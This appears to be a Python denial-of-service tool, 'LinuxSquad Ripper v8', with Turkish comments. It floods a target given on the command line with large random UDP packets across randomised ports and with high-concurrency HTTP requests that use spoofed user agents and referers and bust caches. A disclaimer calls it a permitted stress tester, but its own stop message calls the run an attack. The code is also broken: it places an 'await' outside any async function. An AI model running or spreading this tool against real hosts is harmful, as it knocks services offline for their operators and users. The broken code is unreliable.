"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    LINUXSQUAD RIPPER v8 - ULTIMATE ROOTSUZ                   ║
║                  High Performance Stress Testing Tool (UDP + HTTP)           ║
╚══════════════════════════════════════════════════════════════════════════════╝

YASAL UYARI - ÖNEMLİ:

Bu araç yalnızca EĞİTİM AMAÇLI ve KENDİ KONTROLLÜ TEST ORTAMINIZDA 
(izin alınmış laboratuvar, kendi sunucularınız veya test sistemleriniz) 
kullanılmak üzere geliştirilmiştir.

Herhangi bir izinsiz hedefe karşı kullanmak YASAKTIR ve 
ilgili ülkelerin yasalarına göre ağır cezai yaptırımlara tabidir.

Kullanıcı, bu kodun kullanımından doğabilecek tüm yasal, etik ve teknik 
sorumluluğu tamamen kendisi kabul etmiş sayılır.

Sadece izinli stres testi ve performans testi amacıyla kullanınız.
"""

import sys
import socket
import threading
import random
import time
import asyncio
import os
import signal
from datetime import datetime

# Performans için uvloop (mümkünse)
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_ENABLED = True
except ImportError:
    UVLOOP_ENABLED = False

import aiohttp

# ===================== BANNER =====================
os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════════════════╗")
print("║                    LINUXSQUAD RIPPER v8 - ULTIMATE ROOTSUZ                  ║")
print("║               Maximum Performance UDP + HTTP Stress Tester                  ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝")
print("\033[0m")

print("\033[91m[!] SADECE EĞİTİM VE İZİNLİ TEST ORTAMINDA KULLANINIZ.\033[0m\n")

# ===================== ARGÜMAN KONTROLÜ =====================
if len(sys.argv) < 3:
    print("\033[96mKullanım:\033[0m")
    print(f"   python {os.path.basename(sys.argv[0])} <HEDEF> <PORT> [CONCURRENCY] [SÜRE] [METHOD]")
    print("\n   METHOD : udp | http | mixed")
    print("   Örnek  : python ripper.py 1.1.1.1 80 1500 300 mixed")
    print("\nKurulum:")
    print("   pip install aiohttp uvloop")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 1200
duration = int(sys.argv[4]) if len(sys.argv) > 4 else 0
method = sys.argv[5].lower() if len(sys.argv) > 5 else "mixed"

# ===================== İSTATİSTİK SİSTEMİ =====================
stats = {
    "udp_packets": 0,
    "udp_bytes": 0,
    "http_requests": 0,
    "errors": 0,
    "start_time": time.time()
}
stats_lock = threading.Lock()

def update_stats(udp_pkt=0, udp_bytes=0, http_req=0, err=0):
    with stats_lock:
        stats["udp_packets"] += udp_pkt
        stats["udp_bytes"] += udp_bytes
        stats["http_requests"] += http_req
        stats["errors"] += err

def print_stats():
    """Gerçek zamanlı istatistik gösterimi"""
    while True:
        time.sleep(2)
        elapsed = time.time() - stats["start_time"]
        if elapsed < 1:
            continue

        pps = stats["udp_packets"] / elapsed
        mbps = (stats["udp_bytes"] * 8) / (elapsed * 1_000_000)
        rps = stats["http_requests"] / elapsed

        print(f"\033[94m[STATS] UDP PPS: {pps:,.0f} | Bandwidth: {mbps:.2f} Mbps | "
              f"HTTP RPS: {rps:,.0f} | Errors: {stats['errors']}\033[0m", end="\r")

# ===================== UDP FLOOD - MAX OPTIMIZATION =====================
def udp_flood_worker():
    """Maksimum UDP performansı için optimize edilmiş worker"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Maksimum send buffer (32MB+)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)  # 64 MB
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except Exception as e:
        print(f"\033[91m[UDP] Socket oluşturulamadı: {e}\033[0m")
        return

    while True:
        try:
            # Agresif port randomization
            target_port = port if random.random() > 0.25 else random.randint(1, 65535)
            
            # Agresif paket boyutu randomization
            packet_size = random.randint(6144, 16384)
            payload = random.randbytes(packet_size)

            sock.sendto(payload, (target, target_port))
            update_stats(udp_pkt=1, udp_bytes=packet_size)

        except Exception:
            update_stats(err=1)

# ===================== ASYNC HTTP FLOOD - HIGH CONCURRENCY =====================
async def http_flood_worker(session: aiohttp.ClientSession):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "DNT": "1",
                "Upgrade-Insecure-Requests": "1"
            }

            # Güçlü cache busting
            cache_buster = f"?cache={int(time.time() * 1000000)}{random.randint(1000, 9999)}"
            path = random.choice(PATHS) + cache_buster

            url = f"http://{target}:{port}{path}" if port not in (80, 443) else f"http://{target}{path}"

            async with session.get(url, headers=headers, timeout=5) as response:
                await response.read()  # Bağlantıyı açık tutmak için oku

            update_stats(http_req=1)

        except asyncio.TimeoutError:
            update_stats(err=1)
        except Exception:
            update_stats(err=1)

# ===================== GERÇEKÇİ VERİLER =====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:135.0) Gecko/135.0 Firefox/135.0",
]

REFERERS = [
    "https://www.google.com/", "https://youtube.com/", "https://facebook.com/",
    "https://twitter.com/", "https://instagram.com/", "https://www.bing.com/",
    "https://reddit.com/", "https://t.co/"
]

PATHS = [
    "/", "/index", "/home", "/api/v1", "/search", "/products", "/login", 
    "/admin", "/dashboard", "/api/users", "/v2/data", "/static/main.js", "/contact"
]

# ===================== ANA PROGRAM =====================
print(f"\033[91m[+] Hedef → {target}:{port}")
print(f"[+] Concurrency → {concurrency} | Method → {method.upper()}\033[0m")

if UVLOOP_ENABLED:
    print("\033[92m[+] uvloop aktif - Yüksek performans modu çalışıyor\033[0m")

# İstatistik thread'i
threading.Thread(target=print_stats, daemon=True).start()

start_time = time.time()

try:
    # UDP Flood
    if method in ["udp", "mixed"]:
        udp_count = int(concurrency * 0.68) if method == "mixed" else concurrency
        print(f"\033[92m[+] {udp_count} UDP Worker başlatılıyor...\033[0m")
        for _ in range(udp_count):
            threading.Thread(target=udp_flood_worker, daemon=True).start()

    # HTTP Flood
    if method in ["http", "mixed"]:
        http_count = int(concurrency * 0.32) if method == "mixed" else concurrency // 2
        print(f"\033[92m[+] {http_count} HTTP Async Worker başlatılıyor...\033[0m")

        async def run_http_flood():
            connector = aiohttp.TCPConnector(
                limit=0,
                limit_per_host=0,
                ttl_dns_cache=300,
                keepalive_timeout=25,
                use_dns_cache=True
            )
            timeout = aiohttp.ClientTimeout(total=7, sock_connect=4)

            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = [asyncio.create_task(http_flood_worker(session)) for _ in range(http_count)]
                await asyncio.gather(*tasks, return_exceptions=True)

        asyncio.run(run_http_flood())

    # Süre kontrolü
    if duration > 0:
        print(f"\033[93m[+] Süre sınırı aktif: {duration} saniye\033[0m")
        await asyncio.sleep(duration)
    else:
        while True:
            await asyncio.sleep(10)

except KeyboardInterrupt:
    print("\n\n\033[91m[-] Saldırı kullanıcı tarafından durduruldu (Ctrl+C)\033[0m")
except Exception as e:
    print(f"\033[91m[!] Kritik hata: {e}\033[0m")
finally:
    elapsed = time.time() - start_time
    print(f"\n\033[92m[+] Test tamamlandı. Toplam çalışma süresi: {elapsed:.1f} saniye\033[0m")
